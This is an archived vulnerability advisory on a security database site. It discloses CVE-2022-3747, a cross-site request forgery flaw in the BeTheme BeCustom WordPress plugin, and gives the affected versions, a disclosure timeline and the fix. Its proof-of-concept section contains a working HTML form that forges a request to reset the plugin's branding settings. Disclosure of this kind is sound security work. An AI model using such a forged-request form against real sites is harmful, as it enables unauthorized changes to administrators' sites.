---
title: WordPress BeTheme BeCustom 1.0.5.2 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2022110025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:47.283566
---

# WordPress BeTheme BeCustom 1.0.5.2 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress BeTheme BeCustom 1.0.5.2 Cross Site Request Forgery** **2022.11.15**  Credit:  **[Julien Ahrens](https://cxsecurity.com/author/Julien%2BAhrens/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-3747](https://cxsecurity.com/cveshow/CVE-2022-3747/ "Click to see CVE-2022-3747")**  CWE: **[CWE-253](https://cxsecurity.com/cwe/CWE-253 "Click to see CWE-253")  [CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: BeCustom Wordpress Plugin
Vendor URL: https://muffingroup.com/betheme/features/be-custom/
Type: Cross-Site Request Forgery [CWE-253]
Date found: 2021-10-28
Date published: 2022-11-10
CVSSv3 Score: 5.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:N)
CVE: CVE-2022-3747
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
BeTheme BeCustom 1.0.5.2 and below
4. INTRODUCTION
===============
Built in-house add-on, perfect for agencies and web developers will let you rebrand
Be & WordPresss Admin to your own product by replacing all the Be & Muffin logos with
own.
This tool is supplied exclusively to the customers of Betheme and allows for changes
like: complete dashboard customization, replacement of logos, colors managment and much
more. With just a few clicks, you will turn the Be & Muffin brand into yours, thanks to
which you will increase the trust of your customers.
Moreover, from now on you can also customize the WPLogin page.
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The WordPress plugin lacks an anti-CSRF protection on all of its functionalities, which
ultimately allows an attacker to (amongst others):
- Set custom brandings
- Enable/Disable BeCustom features
- Modify the WP Login view
- Modify the BeDashboard texts
Since there is no anti-CSRF token protecting these functionalities, they are
vulnerable to Cross-Site Request Forgery attacks allowing an attacker to perform
a variety of attacks as mentioned above.
To successfully exploit this vulnerability, a user with the right to access the
plugin must be tricked into visiting an arbitrary website while having an authenticated
session in the application.
6. PROOF OF CONCEPT
===================
An exemplary exploit to reset the plugin's configuration:
<html>
<body>
<form action="http://localhost/wp-admin/admin.php?page=be\_custom\_branding" method="POST">
<input type="hidden" name="betheme&#95;label" value="" />
<input type="hidden" name="betheme&#95;url&#95;slug" value="" />
<input type="hidden" name="replaced&#95;logo&#95;url" value="" />
<input type="hidden" name="replaced&#95;theme&#95;image" value="" />
<input type="hidden" name="replaced&#95;theme&#95;desc" value="" />
<input type="hidden" name="replaced&#95;theme&#95;author" value="Muffin&#32;Group&#32;1337" />
<input type="hidden" name="submit" value="Save&#32;changes" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
7. SOLUTION
===========
Update to BeCustom 1.0.5.3
8. REPORT TIMELINE
==================
2022-10-28: Discovery of the vulnerability
2022-10-28: CVE requested from Wordfence (CNA)
2022-10-28: Wordfence assigns CVE-2022-3747
2022-11-01: Vendor notification
2022-11-07: No response. Sent another notification.
2022-11-08: Opened up a security support case on envato.com
2022-11-xx: Vendor publishes version 1.0.5.3 without notification which fixes this issue
2022-11-10: Public disclosure
9. REFERENCES
=============
https://github.com/MrTuxracer/advisories

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top